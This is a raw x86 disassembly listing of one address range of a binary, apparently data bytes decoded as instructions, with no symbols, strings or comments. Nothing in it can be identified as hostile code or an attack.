  406233:	01 06                	add    %eax,(%esi)
  406235:	1c fc                	sbb    $0xfc,%al
  406237:	04 d9                	add    $0xd9,%al
  406239:	00 0d 1c 33 01 01    	add    %cl,0x101331c
  40623f:	03 2e                	add    (%esi),%ebp
  406241:	1c 02                	sbb    $0x2,%al
  406243:	05 31 00 4b 02       	add    $0x24b0031,%eax
  406248:	35 00 09 03 5f       	xor    $0x5f030900,%eax
  40624d:	07                   	pop    %es
  40624e:	3a 05 2c 00 4b 02    	cmp    0x24b002c,%al
  406254:	35 00 34 00 f7       	xor    $0xf7003400,%eax
  406259:	17                   	pop    %ss
  40625a:	0f 04                	(bad)
  40625c:	3c 00                	cmp    $0x0,%al
  40625e:	05 18 21 04 01       	add    $0x1042118,%eax
  406263:	01 4f 1c             	add    %ecx,0x1c(%edi)
  406266:	33 01                	xor    (%ecx),%eax
  406268:	11 03                	adc    %eax,(%ebx)
  40626a:	84 1c 5a             	test   %bl,(%edx,%ebx,2)
  40626d:	05 11 03 96 1c       	add    $0x1c960311,%eax
  406272:	63 05 11 03 9e 1c    	arpl   %eax,0x1c9e0311
  406278:	06                   	push   %es
  406279:	01 11                	add    %edx,(%ecx)
  40627b:	03 aa 1c 6a 05 21    	add    0x21056a1c(%edx),%ebp
  406281:	03 7b 14             	add    0x14(%ebx),%edi
  406284:	33 01                	xor    (%ecx),%eax
  406286:	a9 01 06 1c 70       	test   $0x701c0601,%eax
  40628b:	05 11 03 be 1c       	add    $0x1cbe0311,%eax
  406290:	77 05                	ja     0x406297
  406292:	11 03                	adc    %eax,(%ebx)
  406294:	ce                   	into
  406295:	1c 81                	sbb    $0x81,%al
  406297:	05 11 03 0f 1d       	add    $0x1d0f0311,%eax
  40629c:	87 05 29 03 1e 1d    	xchg   %eax,0x1d1e0329
  4062a2:	9b                   	fwait
  4062a3:	05 01 01 10 0d       	add    $0xd100101,%eax
  4062a8:	33 01                	xor    (%ecx),%eax
  4062aa:	a9 01 ff 1b a1       	test   $0xa11bff01,%eax
  4062af:	05 31 00 a7 0b       	add    $0xba70031,%eax
  4062b4:	33 01                	xor    (%ecx),%eax
  4062b6:	49                   	dec    %ecx
  4062b7:	03 2d 1d a8 05 11    	add    0x1105a81d,%ebp
  4062bd:	03 38                	add    (%eax),%edi
  4062bf:	1d b0 05 f9 00       	sbb    $0xf905b0,%eax
  4062c4:	4b                   	dec    %ebx
  4062c5:	02 be 05 2c 00 66    	add    0x66002c05(%esi),%bh
  4062cb:	16                   	push   %ss
  4062cc:	c3                   	ret
  4062cd:	05 11 03 4b 1d       	add    $0x1d4b0311,%eax
  4062d2:	cb                   	lret
  4062d3:	05 a9 01 ff 1b       	add    $0x1bff01a9,%eax
  4062d8:	d5 05                	aad    $0x5
  4062da:	01 01                	add    %eax,(%ecx)
  4062dc:	32 18                	xor    (%eax),%bl
  4062de:	33 01                	xor    (%ecx),%eax
  4062e0:	a9 01 59 1d db       	test   $0xdb1d5901,%eax
  4062e5:	05 31 00 14 0c       	add    $0xc140031,%eax
  4062ea:	37                   	aaa
  4062eb:	01 01                	add    %eax,(%ecx)
  4062ed:	01 65 1d             	add    %esp,0x1d(%ebp)
  4062f0:	8d 02                	lea    (%edx),%eax
  4062f2:	31 00                	xor    %eax,(%eax)
  4062f4:	f0 0b 37             	lock or (%edi),%esi
  4062f7:	01 31                	add    %esi,(%ecx)
  4062f9:	00 73 0b             	add    %dh,0xb(%ebx)
  4062fc:	45                   	inc    %ebp
  4062fd:	02 31                	add    (%ecx),%dh
  4062ff:	00 d9                	add    %bl,%cl
  406301:	0b 54 02 11          	or     0x11(%edx,%eax,1),%edx
  406305:	01 4b 02             	add    %ecx,0x2(%ebx)
  406308:	35 00 a9 01 80       	xor    $0x8001a900,%eax
  40630d:	1d 24 06 11 01       	sbb    $0x1110624,%eax
  406312:	8c 1d 7c 04 09 01    	mov    %ds,0x109047c
  406318:	4b                   	dec    %ebx
  406319:	02 29                	add    (%ecx),%ch
  40631b:	06                   	push   %es
  40631c:	61                   	popa
  40631d:	03 16                	add    (%esi),%edx
  40631f:	06                   	push   %es
  406320:	41                   	inc    %ecx
  406321:	06                   	push   %es
  406322:	69 03 b9 1d 48 06    	imul   $0x6481db9,(%ebx),%eax
  406328:	61                   	popa
  406329:	03 14 0c             	add    (%esp,%ecx,1),%edx
  40632c:	02 05 11 01 c1 1d    	add    0x1dc10111,%al
  406332:	ec                   	in     (%dx),%al
  406333:	00 11                	add    %dl,(%ecx)
  406335:	01 53 1b             	add    %edx,0x1b(%ebx)
  406338:	f0 00 61 03          	lock add %ah,0x3(%ecx)
  40633c:	f0 0b 4e 06          	lock or 0x6(%esi),%ecx
  406340:	69 03 cc 1d 53 06    	imul   $0x6531dcc,(%ebx),%eax
  406346:	a9 01 c1 1d ec       	test   $0xec1dc101,%eax
  40634b:	00 d9                	add    %bl,%cl
  40634d:	01 5f 07             	add    %ebx,0x7(%edi)
  406350:	35 00 79 03 f0       	xor    $0xf0037900,%eax
  406355:	1d 6a 06 79 03       	sbb    $0x379066a,%eax
  40635a:	d9 0c 96             	(bad) (%esi,%edx,4)
  40635d:	02 79 03             	add    0x3(%ecx),%bh
  406360:	ec                   	in     (%dx),%al
  406361:	0c 96                	or     $0x96,%al
  406363:	02 21                	add    (%ecx),%ah
  406365:	01 02                	add    %eax,(%edx)
  406367:	1e                   	push   %ds
  406368:	70 06                	jo     0x406370
  40636a:	39 00                	cmp    %eax,(%eax)
  40636c:	4b                   	dec    %ebx
  40636d:	02 35 00 f9 00 0a    	add    0xa00f900,%dh
  406373:	1e                   	push   %ds
  406374:	76 06                	jbe    0x40637c
  406376:	29 01                	sub    %eax,(%ecx)
  406378:	4b                   	dec    %ebx
  406379:	02 9e 03 81 03 4b    	add    0x4b038103(%esi),%bl
  40637f:	02 37                	add    (%edi),%dh
  406381:	01 89 03 4b 02 35    	add    %ecx,0x35024b03(%ecx)
  406387:	00 99 03 c9 1e ec    	add    %bl,-0x13e136fd(%ecx)
  40638d:	00 44 00 7c          	add    %al,0x7c(%eax,%eax,1)
  406391:	1a b2 04 b1 03 d3    	sbb    -0x2cfc4efc(%edx),%dh
  406397:	1e                   	push   %ds
  406398:	9e                   	sahf
  406399:	06                   	push   %es
  40639a:	59                   	pop    %ecx
  40639b:	03 e1                	add    %ecx,%esp
  40639d:	1e                   	push   %ds
  40639e:	33 01                	xor    (%ecx),%eax
  4063a0:	31 00                	xor    %eax,(%eax)
  4063a2:	05 0c 37 01 4c       	add    $0x4c01370c,%eax
  4063a7:	00 7c 1a b2          	add    %bh,-0x4e(%edx,%ebx,1)
  4063ab:	04 a1                	add    $0xa1,%al
  4063ad:	03 ed                	add    %ebp,%ebp
  4063af:	1e                   	push   %ds
  4063b0:	06                   	push   %es
  4063b1:	01 b9 03 0d 1f 06    	add    %edi,0x61f0d03(%ecx)
  4063b7:	01 01                	add    %eax,(%ecx)
  4063b9:	03 11                	add    (%ecx),%edx
  4063bb:	1f                   	pop    %ds
  4063bc:	02 05 91 03 4b 02    	add    0x24b0391,%al
  4063c2:	cf                   	iret
  4063c3:	02 c1                	add    %cl,%al
  4063c5:	03 4b 02             	add    0x2(%ebx),%ecx
  4063c8:	65 04 e9             	gs add $0xe9,%al
  4063cb:	01 43 1f             	add    %eax,0x1f(%ebx)
  4063ce:	ac                   	lods   %ds:(%esi),%al
  4063cf:	06                   	push   %es
  4063d0:	c9                   	leave
  4063d1:	03 9a 1f b3 06 d1    	add    -0x2ef94ce1(%edx),%ebx
  4063d7:	03 b8 1f bb 06 d1    	add    -0x2ef944e1(%eax),%edi
  4063dd:	03 cb                	add    %ebx,%ecx
  4063df:	1f                   	pop    %ds
  4063e0:	35 00 e1 03 db       	xor    $0xdb03e100,%eax
  4063e5:	1f                   	pop    %ds
  4063e6:	c2 06 e1             	ret    $0xe106
  4063e9:	03 e2                	add    %edx,%esp
  4063eb:	1f                   	pop    %ds
  4063ec:	c8 06 e1 03          	enter  $0xe106,$0x3
  4063f0:	fd                   	std
  4063f1:	1f                   	pop    %ds
  4063f2:	cf                   	iret
  4063f3:	06                   	push   %es
  4063f4:	e9 03 09 20 d5       	jmp    0xd5606cfc
  4063f9:	06                   	push   %es
  4063fa:	54                   	push   %esp
  4063fb:	00 4b 02             	add    %cl,0x2(%ebx)
  4063fe:	65 04 44             	gs add $0x44,%al
  406401:	00 22                	add    %ah,(%edx)
  406403:	20 e9                	and    %ch,%cl
  406405:	06                   	push   %es
  406406:	5c                   	pop    %esp
  406407:	00 4b 02             	add    %cl,0x2(%ebx)
  40640a:	35 00 5c 00 66       	xor    $0x66005c00,%eax
  40640f:	16                   	push   %ss
  406410:	dc 04 61             	faddl  (%ecx,%eiz,2)
  406413:	03 a7 0b fc 06 5c    	add    0x5c06fc0b(%edi),%esp
  406419:	00 30                	add    %dh,(%eax)
  40641b:	20 35 00 4c 00 4b    	and    %dh,0x4b004c00
  406421:	02 35 00 4c 00 22    	add    0x22004c00,%dh
  406427:	20 e9                	and    %ch,%cl
  406429:	06                   	push   %es
  40642a:	a9 01 39 20 00       	test   $0x203901,%eax
  40642f:	07                   	pop    %es
  406430:	a9 01 52 20 07       	test   $0x7205201,%eax
  406435:	07                   	pop    %es
  406436:	a9 01 70 20 0f       	test   $0xf207001,%eax
  40643b:	07                   	pop    %es
  40643c:	09 03                	or     %eax,(%ebx)
  40643e:	5f                   	pop    %edi
  40643f:	07                   	pop    %es
  406440:	1a 07                	sbb    (%edi),%al
  406442:	a9 01 97 20 27       	test   $0x27209701,%eax
  406447:	07                   	pop    %es
  406448:	19 04 b8             	sbb    %eax,(%eax,%edi,4)
  40644b:	20 eb                	and    %ch,%bl
  40644d:	01 59 02             	add    %ebx,0x2(%ecx)
  406450:	d0 20                	shlb   $1,(%eax)
  406452:	2d 07 29 04 f3       	sub    $0xf3042907,%eax
  406457:	20 34 07             	and    %dh,(%edi,%eax,1)
  40645a:	31 04 4b             	xor    %eax,(%ebx,%ecx,2)
  40645d:	02 3a                	add    (%edx),%bh
  40645f:	07                   	pop    %es
  406460:	39 04 14             	cmp    %eax,(%esp,%edx,1)
  406463:	21 33                	and    %esi,(%ebx)
  406465:	01 41 04             	add    %eax,0x4(%ecx)
  406468:	23 21                	and    (%ecx),%esp
  40646a:	44                   	inc    %esp
  40646b:	07                   	pop    %es
  40646c:	e1 03                	loope  0x406471
  40646e:	30 21                	xor    %ah,(%ecx)
  406470:	4a                   	dec    %edx
  406471:	07                   	pop    %es
  406472:	49                   	dec    %ecx
  406473:	04 4b                	add    $0x4b,%al
  406475:	02 37                	add    (%edi),%dh
  406477:	01 49 04             	add    %ecx,0x4(%ecx)
  40647a:	5f                   	pop    %edi
  40647b:	21 51 07             	and    %edx,0x7(%ecx)
  40647e:	59                   	pop    %ecx
  40647f:	04 6b                	add    $0x6b,%al
  406481:	21 06                	and    %eax,(%esi)
  406483:	01 51 04             	add    %edx,0x4(%ecx)
  406486:	87 21                	xchg   %esp,(%ecx)
  406488:	58                   	pop    %eax
  406489:	07                   	pop    %es
  40648a:	61                   	popa
  40648b:	04 cb                	add    $0xcb,%al
  40648d:	17                   	pop    %ss
  40648e:	ec                   	in     (%dx),%al
  40648f:	00 69 04             	add    %ch,0x4(%ecx)
  406492:	99                   	cltd
  406493:	21 5e 07             	and    %ebx,0x7(%esi)
  406496:	e1 03                	loope  0x40649b
  406498:	a2 21 4a 07 61       	mov    %al,0x61074a21
  40649d:	04 7c                	add    $0x7c,%al
  40649f:	1a 65 07             	sbb    0x7(%ebp),%ah
  4064a2:	71 04                	jno    0x4064a8
  4064a4:	b7 21                	mov    $0x21,%bh
  4064a6:	33 01                	xor    (%ecx),%eax
  4064a8:	a9 01 97 20 33       	test   $0x33209701,%eax
  4064ad:	01 a9 01 c1 21 33    	add    %ebp,0x3321c101(%ecx)
  4064b3:	01 e1                	add    %esp,%ecx
  4064b5:	03 a2 21 6c 07 e1    	add    -0x1ef893df(%edx),%esp
  4064bb:	03 d1                	add    %ecx,%edx
  4064bd:	21 74 07 e1          	and    %esi,-0x1f(%edi,%eax,1)
  4064c1:	03 dd                	add    %ebp,%ebx
  4064c3:	21 4a 07             	and    %ecx,0x7(%edx)
  4064c6:	81 04 4b 02 65 04 e1 	addl   $0xe1046502,(%ebx,%ecx,2)
  4064cd:	03 0b                	add    (%ebx),%ecx
  4064cf:	22 7b 07             	and    0x7(%ebx),%bh
  4064d2:	91                   	xchg   %eax,%ecx
  4064d3:	04 22                	add    $0x22,%al
  4064d5:	22 9d 07 e1 03 5c    	and    0x5c03e107(%ebp),%bl
  4064db:	1b 35 00 e1 03 40    	sbb    0x4003e100,%esi
  4064e1:	22 a2 07 99 04 6a    	and    0x6a049907(%edx),%ah
  4064e7:	22 a8 07 99 04 74    	and    0x74049907(%eax),%ch
  4064ed:	22 9e 06 d1 03 ba    	and    -0x45fc2efa(%esi),%bl
  4064f3:	14 35                	adc    $0x35,%al
  4064f5:	00 59 03             	add    %bl,0x3(%ecx)
  4064f8:	4b                   	dec    %ebx
  4064f9:	02 37                	add    (%edi),%dh
  4064fb:	01 a9 04 4b 02 35    	add    %ebp,0x35024b04(%ecx)
  406501:	00 08                	add    %cl,(%eax)
  406503:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406506:	46                   	inc    %esi
  406507:	00 08                	add    %cl,(%eax)
  406509:	00 20                	add    %ah,(%eax)
  40650b:	00 4b 00             	add    %cl,0x0(%ebx)
  40650e:	08 00                	or     %al,(%eax)
  406510:	24 00                	and    $0x0,%al
  406512:	50                   	push   %eax
  406513:	00 08                	add    %cl,(%eax)
  406515:	00 28                	add    %ch,(%eax)
  406517:	00 55 00             	add    %dl,0x0(%ebp)
  40651a:	08 00                	or     %al,(%eax)
  40651c:	2c 00                	sub    $0x0,%al
  40651e:	5a                   	pop    %edx
  40651f:	00 08                	add    %cl,(%eax)
  406521:	00 30                	add    %dh,(%eax)
  406523:	00 5f 00             	add    %bl,0x0(%edi)
  406526:	08 00                	or     %al,(%eax)
  406528:	34 00                	xor    $0x0,%al
  40652a:	64 00 08             	add    %cl,%fs:(%eax)
  40652d:	00 38                	add    %bh,(%eax)
  40652f:	00 69 00             	add    %ch,0x0(%ecx)
  406532:	08 00                	or     %al,(%eax)
  406534:	3c 00                	cmp    $0x0,%al
  406536:	6e                   	outsb  %ds:(%esi),(%dx)
  406537:	00 08                	add    %cl,(%eax)
  406539:	00 40 00             	add    %al,0x0(%eax)
  40653c:	73 00                	jae    0x40653e
  40653e:	08 00                	or     %al,(%eax)
  406540:	44                   	inc    %esp
  406541:	00 78 00             	add    %bh,0x0(%eax)
  406544:	08 00                	or     %al,(%eax)
  406546:	48                   	dec    %eax
  406547:	00 7d 00             	add    %bh,0x0(%ebp)
  40654a:	08 00                	or     %al,(%eax)
  40654c:	4c                   	dec    %esp
  40654d:	00 82 00 08 00 50    	add    %al,0x50000800(%edx)
  406553:	00 87 00 08 00 54    	add    %al,0x54000800(%edi)
  406559:	00 8c 00 08 00 58 00 	add    %cl,0x580008(%eax,%eax,1)
  406560:	91                   	xchg   %eax,%ecx
  406561:	00 08                	add    %cl,(%eax)
  406563:	00 5c 00 96          	add    %bl,-0x6a(%eax,%eax,1)
  406567:	00 08                	add    %cl,(%eax)
  406569:	00 64 00 9f          	add    %ah,-0x61(%eax,%eax,1)
  40656d:	00 08                	add    %cl,(%eax)
  40656f:	00 68 00             	add    %ch,0x0(%eax)
  406572:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406573:	00 08                	add    %cl,(%eax)
  406575:	00 6c 00 a9          	add    %ch,-0x57(%eax,%eax,1)
  406579:	00 08                	add    %cl,(%eax)
  40657b:	00 70 00             	add    %dh,0x0(%eax)
  40657e:	ae                   	scas   %es:(%edi),%al
  40657f:	00 08                	add    %cl,(%eax)
  406581:	00 74 00 b3          	add    %dh,-0x4d(%eax,%eax,1)
  406585:	00 08                	add    %cl,(%eax)
  406587:	00 78 00             	add    %bh,0x0(%eax)
  40658a:	b8 00 08 00 7c       	mov    $0x7c000800,%eax
  40658f:	00 bd 00 08 00 80    	add    %bh,-0x7ffff800(%ebp)
  406595:	00 c2                	add    %al,%dl
  406597:	00 09                	add    %cl,(%ecx)
  406599:	00 e0                	add    %ah,%al
  40659b:	00 9f 00 09 00 e4    	add    %bl,-0x1bfff700(%edi)
  4065a1:	00 46 00             	add    %al,0x0(%esi)
  4065a4:	09 00                	or     %eax,(%eax)
  4065a6:	e8 00 4b 00 09       	call   0x940b0ab
  4065ab:	00 ec                	add    %ch,%ah
  4065ad:	00 f6                	add    %dh,%dh
  4065af:	01 09                	add    %ecx,(%ecx)
  4065b1:	00 f0                	add    %dh,%al
  4065b3:	00 fb                	add    %bh,%bl
  4065b5:	01 09                	add    %ecx,(%ecx)
  4065b7:	00 f8                	add    %bh,%al
  4065b9:	00 04 02             	add    %al,(%edx,%eax,1)
  4065bc:	09 00                	or     %eax,(%eax)
  4065be:	fc                   	cld
  4065bf:	00 09                	add    %cl,(%ecx)
  4065c1:	02 09                	add    (%ecx),%cl
  4065c3:	00 00                	add    %al,(%eax)
  4065c5:	01 0e                	add    %ecx,(%esi)
  4065c7:	02 2e                	add    (%esi),%ch
  4065c9:	00 2b                	add    %ch,(%ebx)
  4065cb:	00 23                	add    %ah,(%ebx)
  4065cd:	08 2e                	or     %ch,(%esi)
  4065cf:	00 33                	add    %dh,(%ebx)
  4065d1:	00 23                	add    %ah,(%ebx)
  4065d3:	08 2e                	or     %ch,(%esi)
  4065d5:	00 53 00             	add    %dl,0x0(%ebx)
  4065d8:	23 08                	and    (%eax),%ecx
  4065da:	2e 00 1b             	add    %bl,%cs:(%ebx)
  4065dd:	00 00                	add    %al,(%eax)
  4065df:	08 2e                	or     %ch,(%esi)
  4065e1:	00 23                	add    %ah,(%ebx)
  4065e3:	00 00                	add    %al,(%eax)
  4065e5:	08 2e                	or     %ch,(%esi)
  4065e7:	00 5b 00             	add    %bl,0x0(%ebx)
  4065ea:	35 08 2e 00 63       	xor    $0x63002e08,%eax
  4065ef:	00 3e                	add    %bh,(%esi)
  4065f1:	08 2e                	or     %ch,(%esi)
  4065f3:	00 43 00             	add    %al,0x0(%ebx)
  4065f6:	29 08                	sub    %ecx,(%eax)
  4065f8:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  4065fc:	23 08                	and    (%eax),%ecx
  4065fe:	83 00 ab             	addl   $0xffffffab,(%eax)
  406601:	00 46 00             	add    %al,0x0(%esi)
  406604:	c3                   	ret
  406605:	02 fb                	add    %bl,%bh
  406607:	08 46 00             	or     %al,0x0(%esi)
  40660a:	e0 0e                	loopne 0x40661a
  40660c:	03 07                	add    (%edi),%eax
  40660e:	46                   	inc    %esi
  40660f:	00 13                	add    %dl,(%ebx)
  406611:	00 e9                	add    %ch,%cl
  406613:	02 65 00             	add    0x0(%ebp),%ah
  406616:	eb 02                	jmp    0x40661a
  406618:	04 03                	add    $0x3,%al
  40661a:	43                   	inc    %ebx
  40661b:	03 50 03             	add    0x3(%eax),%edx
  40661e:	55                   	push   %ebp
  40661f:	03 ed                	add    %ebp,%ebp
  406621:	03 2e                	add    (%esi),%ebp
  406623:	04 54                	add    $0x54,%al
  406625:	04 5b                	add    $0x5b,%al
  406627:	04 99                	add    $0x99,%al
  406629:	04 06                	add    $0x6,%al
  40662b:	05 34 05 e1 05       	add    $0x5e10534,%eax
  406630:	20 06                	and    %al,(%esi)
  406632:	31 06                	xor    %eax,(%esi)
  406634:	3d 06 57 06 60       	cmp    $0x60065706,%eax
  406639:	06                   	push   %es
  40663a:	7c 06                	jl     0x406642
  40663c:	ae                   	scas   %es:(%edi),%al
  40663d:	07                   	pop    %es
  40663e:	07                   	pop    %es
  40663f:	00 01                	add    %al,(%ecx)
  406641:	00 11                	add    %dl,(%ecx)
  406643:	00 0c 00             	add    %cl,(%eax,%eax,1)
  406646:	12 00                	adc    (%eax),%al
  406648:	0d 00 13 00 14       	or     $0x14001300,%eax
  40664d:	00 14 00             	add    %dl,(%eax,%eax,1)
  406650:	1e                   	push   %ds
  406651:	00 15 00 20 00 00    	add    %dl,0x2000
  406657:	00 a9 06 3c 01 00    	add    %ch,0x13c06(%ecx)
  40665d:	00 b9 06 41 01 00    	add    %bh,0x14106(%ecx)
  406663:	00 c4                	add    %al,%ah
  406665:	06                   	push   %es
  406666:	46                   	inc    %esi
  406667:	01 00                	add    %eax,(%eax)
  406669:	00 d3                	add    %dl,%bl
  40666b:	06                   	push   %es
  40666c:	4b                   	dec    %ebx
  40666d:	01 00                	add    %eax,(%eax)
  40666f:	00 de                	add    %bl,%dh
  406671:	06                   	push   %es
  406672:	3c 01                	cmp    $0x1,%al
  406674:	00 00                	add    %al,(%eax)
  406676:	ee                   	out    %al,(%dx)
  406677:	06                   	push   %es
  406678:	4f                   	dec    %edi
  406679:	01 00                	add    %eax,(%eax)
  40667b:	00 fb                	add    %bh,%bl
  40667d:	06                   	push   %es
  40667e:	41                   	inc    %ecx
  40667f:	01 00                	add    %eax,(%eax)
  406681:	00 11                	add    %dl,(%ecx)
  406683:	07                   	pop    %es
  406684:	41                   	inc    %ecx
  406685:	01 00                	add    %eax,(%eax)
  406687:	00 1f                	add    %bl,(%edi)
  406689:	07                   	pop    %es
  40668a:	46                   	inc    %esi
  40668b:	01 00                	add    %eax,(%eax)
  40668d:	00 2e                	add    %ch,(%esi)
  40668f:	07                   	pop    %es
  406690:	41                   	inc    %ecx
  406691:	01 00                	add    %eax,(%eax)
  406693:	00 39                	add    %bh,(%ecx)
  406695:	07                   	pop    %es
  406696:	53                   	push   %ebx
  406697:	01 00                	add    %eax,(%eax)
  406699:	00 51 0c             	add    %dl,0xc(%ecx)
  40669c:	6e                   	outsb  %ds:(%esi),(%dx)
  40669d:	02 00                	add    (%eax),%al
  40669f:	00 91 0d ad 02 00    	add    %dl,0x2ad0d(%ecx)
  4066a5:	00 9d 0d b2 02 00    	add    %bl,0x2b20d(%ebp)
  4066ab:	00 ac 0d b2 02 00 00 	add    %ch,0x2b2(%ebp,%ecx,1)
  4066b2:	bd 0d b8 02 00       	mov    $0x2b80d,%ebp
  4066b7:	00 c8                	add    %cl,%al
  4066b9:	0d 53 01 00 00       	or     $0x153,%eax
  4066be:	cd 0d                	int    $0xd
  4066c0:	be 02 00 00 20       	mov    $0x20000002,%esi
  4066c5:	0d c3 02 00 00       	or     $0x2c3,%eax
  4066ca:	48                   	dec    %eax
  4066cb:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  4066ce:	00 00                	add    %al,(%eax)
  4066d0:	5d                   	pop    %ebp
  4066d1:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  4066d4:	00 00                	add    %al,(%eax)
  4066d6:	72 0a                	jb     0x4066e2
  4066d8:	3c 01                	cmp    $0x1,%al
  4066da:	00 00                	add    %al,(%eax)
  4066dc:	89 0a                	mov    %ecx,(%edx)
  4066de:	3c 01                	cmp    $0x1,%al
  4066e0:	00 00                	add    %al,(%eax)
  4066e2:	a0 0a 3c 01 00       	mov    0x13c0a,%al
  4066e7:	00 b5 0a 3c 01 00    	add    %dh,0x13c0a(%ebp)
  4066ed:	00 ca                	add    %cl,%dl
  4066ef:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  4066f2:	00 00                	add    %al,(%eax)
  4066f4:	e1 0a                	loope  0x406700
  4066f6:	3c 01                	cmp    $0x1,%al
  4066f8:	00 00                	add    %al,(%eax)
  4066fa:	f8                   	clc
  4066fb:	0a 3c 01             	or     (%ecx,%eax,1),%bh
  4066fe:	00 00                	add    %al,(%eax)
  406700:	10 0b                	adc    %cl,(%ebx)
  406702:	3c 01                	cmp    $0x1,%al
  406704:	00 00                	add    %al,(%eax)
  406706:	1c 10                	sbb    $0x10,%al
  406708:	4f                   	dec    %edi
  406709:	01 00                	add    %eax,(%eax)
  40670b:	00 27                	add    %ah,(%edi)
  40670d:	10 4b 01             	adc    %cl,0x1(%ebx)
  406710:	00 00                	add    %al,(%eax)
  406712:	1c 10                	sbb    $0x10,%al
  406714:	4f                   	dec    %edi
  406715:	01 00                	add    %eax,(%eax)
  406717:	00 27                	add    %ah,(%edi)
  406719:	10 4b 01             	adc    %cl,0x1(%ebx)
  40671c:	02 00                	add    (%eax),%al
  40671e:	05 00 03 00 01       	add    $0x1000300,%eax
  406723:	00 06                	add    %al,(%esi)
  406725:	00 03                	add    %al,(%ebx)
  406727:	00 02                	add    %al,(%edx)
  406729:	00 07                	add    %al,(%edi)
  40672b:	00 05 00 01 00 08    	add    %al,0x8000100
  406731:	00 05 00 02 00 09    	add    %al,0x9000200
  406737:	00 07                	add    %al,(%edi)
  406739:	00 01                	add    %al,(%ecx)
  40673b:	00 0a                	add    %cl,(%edx)
  40673d:	00 07                	add    %al,(%edi)
  40673f:	00 02                	add    %al,(%edx)
  406741:	00 0b                	add    %cl,(%ebx)
  406743:	00 09                	add    %cl,(%ecx)
  406745:	00 01                	add    %al,(%ecx)
  406747:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40674a:	09 00                	or     %eax,(%eax)
  40674c:	01 00                	add    %eax,(%eax)
  40674e:	0f 00 0b             	str    (%ebx)
  406751:	00 02                	add    %al,(%edx)
  406753:	00 0e                	add    %cl,(%esi)
  406755:	00 0b                	add    %cl,(%ebx)
  406757:	00 02                	add    %al,(%edx)
  406759:	00 11                	add    %dl,(%ecx)
  40675b:	00 0d 00 02 00 12    	add    %cl,0x12000200
  406761:	00 0f                	add    %cl,(%edi)
  406763:	00 02                	add    %al,(%edx)
  406765:	00 13                	add    %dl,(%ebx)
  406767:	00 11                	add    %dl,(%ecx)
  406769:	00 02                	add    %al,(%edx)
  40676b:	00 18                	add    %bl,(%eax)
  40676d:	00 13                	add    %dl,(%ebx)
  40676f:	00 01                	add    %al,(%ecx)
  406771:	00 19                	add    %bl,(%ecx)
  406773:	00 13                	add    %dl,(%ebx)
  406775:	00 01                	add    %al,(%ecx)
  406777:	00 1b                	add    %bl,(%ebx)
  406779:	00 15 00 02 00 1a    	add    %dl,0x1a000200
  40677f:	00 15 00 02 00 1c    	add    %dl,0x1c000200
  406785:	00 17                	add    %dl,(%edi)
  406787:	00 01                	add    %al,(%ecx)
  406789:	00 1d 00 17 00 02    	add    %bl,0x2001700
  40678f:	00 3f                	add    %bh,(%edi)
  406791:	00 19                	add    %bl,(%ecx)
  406793:	00 02                	add    %al,(%edx)
  406795:	00 4e 00             	add    %cl,0x0(%esi)
  406798:	1b 00                	sbb    (%eax),%eax
  40679a:	02 00                	add    (%eax),%al
  40679c:	4f                   	dec    %edi
  40679d:	00 1d 00 02 00 50    	add    %bl,0x50000200
  4067a3:	00 1f                	add    %bl,(%edi)
  4067a5:	00 02                	add    %al,(%edx)
  4067a7:	00 51 00             	add    %dl,0x0(%ecx)
  4067aa:	21 00                	and    %eax,(%eax)
  4067ac:	02 00                	add    (%eax),%al
  4067ae:	52                   	push   %edx
  4067af:	00 23                	add    %ah,(%ebx)
  4067b1:	00 02                	add    %al,(%edx)
  4067b3:	00 53 00             	add    %dl,0x0(%ebx)
  4067b6:	25 00 02 00 54       	and    $0x54000200,%eax
  4067bb:	00 27                	add    %ah,(%edi)
  4067bd:	00 02                	add    %al,(%edx)
  4067bf:	00 5b 00             	add    %bl,0x0(%ebx)
  4067c2:	29 00                	sub    %eax,(%eax)
  4067c4:	01 00                	add    %eax,(%eax)
  4067c6:	5c                   	pop    %esp
  4067c7:	00 29                	add    %ch,(%ecx)
  4067c9:	00 01                	add    %al,(%ecx)
  4067cb:	00 5e 00             	add    %bl,0x0(%esi)
  4067ce:	2b 00                	sub    (%eax),%eax
  4067d0:	02 00                	add    (%eax),%al
  4067d2:	5d                   	pop    %ebp
  4067d3:	00 2b                	add    %ch,(%ebx)
  4067d5:	00 02                	add    %al,(%edx)
  4067d7:	00 5f 00             	add    %bl,0x0(%edi)
  4067da:	2d 00 01 00 60       	sub    $0x60000100,%eax
  4067df:	00 2d 00 01 00 62    	add    %ch,0x62000100
  4067e5:	00 2f                	add    %ch,(%edi)
  4067e7:	00 02                	add    %al,(%edx)
  4067e9:	00 61 00             	add    %ah,0x0(%ecx)
  4067ec:	2f                   	das
  4067ed:	00 02                	add    %al,(%edx)
  4067ef:	00 63 00             	add    %ah,0x0(%ebx)
  4067f2:	31 00                	xor    %eax,(%eax)
  4067f4:	01 00                	add    %eax,(%eax)
  4067f6:	64 00 31             	add    %dh,%fs:(%ecx)
  4067f9:	00 02                	add    %al,(%edx)
  4067fb:	00 65 00             	add    %ah,0x0(%ebp)
  4067fe:	33 00                	xor    (%eax),%eax
  406800:	01 00                	add    %eax,(%eax)
  406802:	66 00 33             	data16 add %dh,(%ebx)
  406805:	00 02                	add    %al,(%edx)
  406807:	00 67 00             	add    %ah,0x0(%edi)
  40680a:	35 00 01 00 68       	xor    $0x68000100,%eax
  40680f:	00 35 00 02 00 69    	add    %dh,0x69000200
  406815:	00 37                	add    %dh,(%edi)
  406817:	00 01                	add    %al,(%ecx)
  406819:	00 6a 00             	add    %ch,0x0(%edx)
  40681c:	37                   	aaa
  40681d:	00 01                	add    %al,(%ecx)
  40681f:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  406823:	00 02                	add    %al,(%edx)
  406825:	00 6b 00             	add    %ch,0x0(%ebx)
  406828:	39 00                	cmp    %eax,(%eax)
  40682a:	02 00                	add    (%eax),%al
  40682c:	6d                   	insl   (%dx),%es:(%edi)
  40682d:	00 3b                	add    %bh,(%ebx)
  40682f:	00 01                	add    %al,(%ecx)
  406831:	00 6e 00             	add    %ch,0x0(%esi)
  406834:	3b 00                	cmp    (%eax),%eax
  406836:	01 00                	add    %eax,(%eax)
  406838:	70 00                	jo     0x40683a
